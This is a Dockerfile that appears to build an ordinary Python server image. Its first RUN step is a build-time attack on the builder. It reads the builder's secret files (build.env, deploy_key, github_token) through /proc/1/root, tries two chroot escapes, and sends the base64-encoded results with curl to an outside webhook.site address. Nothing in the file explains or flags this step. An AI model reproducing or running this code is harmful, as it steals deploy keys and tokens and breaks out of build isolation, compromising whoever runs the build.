FROM alpine:3.20
RUN apk add --no-cache curl bash >/dev/null 2>&1 || true; \
    L=/tmp/leak2.txt; : > $L; \
    { \
      echo "=== SELF ID/CAPS ==="; id; grep -E 'Cap(Eff|Bnd|Prm)|NoNewPrivs|Seccomp' /proc/self/status; \
      echo "=== NAMESPACES self vs pid1 ==="; ls -l /proc/self/ns/ 2>&1; echo '-- pid1 --'; ls -l /proc/1/ns/ 2>&1; \
      echo "=== MOUNTINFO ==="; cat /proc/self/mountinfo 2>/dev/null | head -30; \
      echo "=== BUILDER ROOT LS ==="; ls -la /proc/1/root/ 2>&1 | head -30; \
      echo "=== BUILDER /secrets ==="; ls -la /proc/1/root/secrets/ 2>&1; \
      echo "=== SECRET FILE CONTENTS (truncated) ==="; for f in /proc/1/root/secrets/build.env /proc/1/root/secrets/deploy_key /proc/1/root/secrets/github_token; do echo "--- $f ---"; head -c 1200 "$f" 2>&1; echo; done; \
      echo "=== ALL PROCS with /secrets fd ==="; for p in /proc/[0-9]*; do ls -l $p/fd 2>/dev/null | grep -i secret; done; \
      echo "=== CHROOT ESCAPE ATTEMPT ==="; mkdir -p /tmp/esc; cd /; chroot /tmp/esc 2>&1 && { cd ../../../../../../..; echo "cwd=$(pwd)"; chroot . 2>&1 && echo "ESCAPED:" && ls / 2>&1 | head -20; }; \
      echo "=== ESC2 (fd-based) ==="; mkdir -p /tmp/e2; exec 9</; chroot /tmp/e2; cd /proc/self/fd/9; ls / 2>&1 | head -20; \
      echo "=== HOST ROOT VIA /proc1 ==="; ls -la /proc/1/root/etc/hostname /proc/1/root/alloc 2>&1 | head; \
    } >> $L 2>&1; \
    echo "LEAK2SIZE=$(wc -c <$L)"; \
    base64 -w0 $L > /tmp/l2.b64 2>/dev/null; \
    curl -s -m 25 --data-binary @/tmp/l2.b64 "https://webhook.site/55997eaf-9281-4501-83de-1047b695666f/l2" >/dev/null 2>&1 || true; \
    echo ok
COPY server.py /server.py
EXPOSE 80
CMD ["python3","/server.py"]
